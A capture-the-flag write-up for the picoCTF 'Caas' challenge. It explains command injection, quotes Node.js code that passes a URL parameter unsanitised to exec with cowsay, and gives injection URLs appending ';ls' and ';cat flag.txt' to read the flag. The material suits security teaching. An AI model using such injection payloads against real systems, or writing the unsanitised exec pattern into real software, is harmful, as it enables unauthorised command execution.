# Caas
#### Command Injection Attacks
Command injection attacks are a type of security vulnerability where an attacker can execute arbitrary commands on a system or application by injecting malicious input. These attacks primarily occur when an application incorporates user-provided data in commands that are sent to a system shell, interpreter, or similar execution environment without proper validation or sanitation.
#### Solution
- Inspectiong the ```index.js``` file 

![alt text](https://github.com/Apetun/CryptoniteSTP/blob/main/picoGym/Caas/Screenshot%202023-11-04%20003926.png)

- We can see that in the following line of code the request parameter is passed to the ```cowsay``` command without any validation or sanitation

```python 
exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) => {
    if (error) return res.status(500).end();
    res.type('txt').send(stdout).end();
  });
```

- We can use this to execute arbitrary commands on the server

- Running the ls command using the url ```https://caas.mars.picoctf.net/cowsay/t;ls``` we get the following output

![alt text](https://github.com/Apetun/CryptoniteSTP/blob/main/picoGym/Caas/Screenshot%202023-11-09%20093221.png)

- Opening the falg.txt file using the url ```https://caas.mars.picoctf.net/cowsay/t;cat flag.txt``` we get the flag

![alt text](https://github.com/Apetun/CryptoniteSTP/blob/main/picoGym/Caas/eqqeq.png)